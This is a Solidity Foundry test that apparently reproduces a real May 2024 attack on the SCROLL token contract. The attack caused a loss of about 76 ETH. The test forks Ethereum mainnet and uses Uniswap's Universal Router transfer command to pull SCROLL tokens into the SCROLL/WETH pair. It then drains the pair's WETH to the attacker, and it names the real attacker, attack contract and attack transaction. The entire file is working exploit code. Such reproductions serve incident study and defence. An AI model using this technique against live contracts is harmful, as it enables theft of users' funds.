// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : ~76 ETH
// Attacker : 0x55Db954F0121E09ec838a20c216eABf35Ca32cDD
// Attack Contract : 0x55f5aac4466eb9b7bbeee8c05b365e5b18b5afcc
// Vulnerable Contract : 0xe51D3dE9b81916D383eF97855C271250852eC7B7
// Attack Tx : https://etherscan.io/tx/0x661505c39efe1174da44e0548158db95e8e71ce867d5b7190b9eabc9f314fe91
// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xe51D3dE9b81916D383eF97855C271250852eC7B7#code

// @Analysis
// Twitter Guy : https://x.com/0xNickLFranklin/status/1795650745448169741

interface IUniversalRouter{
    function execute(bytes calldata commands, bytes[] calldata input) external payable;
}

contract ContractTest is Test {
    address public attacker = address(this);
    address public SCROLL_creater = 0x72C509B05A44c4Bb53373Efc2E76fB75FA8108a6;

    IUniswapV2Router router = IUniswapV2Router(payable(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D));
    Uni_Pair_V2 SCROLL_WETH_pair = Uni_Pair_V2(0xa718aa1b3f61C2b90A01aB244597816a7eE69fD2);
    IUniversalRouter universalRouter = IUniversalRouter(payable(0x3fC91A3afd70395Cd496C647d5a6CC9D4B2b7FAD));
    
    IERC20 constant SCROLL = IERC20(0xe51D3dE9b81916D383eF97855C271250852eC7B7);
    WETH9 constant WETH = WETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    
    function setUp() public {
        vm.createSelectFork("mainnet", 19971611-1);
        vm.label(address(SCROLL), "SCROLL");
        vm.label(address(WETH), "WETH");
        vm.label(address(universalRouter), "Universal Router");
        vm.label(address(SCROLL_WETH_pair), "Uniswap V2 pair SCROLL WETH");
        vm.label(address(router), "Uniswap V2 Router");
    }
    
    function testExploit() public {
        SCROLL.balanceOf(address(universalRouter));
        bytes memory commands = hex"05";
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(address(SCROLL), address(SCROLL_creater), uint256(1));
        universalRouter.execute(commands, inputs);
        SCROLL.balanceOf(address(universalRouter));

        address[] memory path = new address[](2);
        path[0] = address(SCROLL);
        path[1] = address(WETH);
        uint256[] memory amounts = new uint256[](2);
        amounts = router.getAmountsOut(SCROLL.balanceOf(address(SCROLL_WETH_pair)) * 1e3, path);

        inputs[0] = abi.encode(address(SCROLL), address(SCROLL_WETH_pair), uint256(amounts[0]));
        universalRouter.execute(commands, inputs);

        SCROLL_WETH_pair.swap(amounts[1], 0, attacker, "");
        WETH.withdraw(WETH.balanceOf(attacker));

        inputs[0] = abi.encode(address(SCROLL), address(attacker), SCROLL.balanceOf(address(universalRouter)));
        universalRouter.execute(commands, inputs);
    }

    fallback() external payable {}
}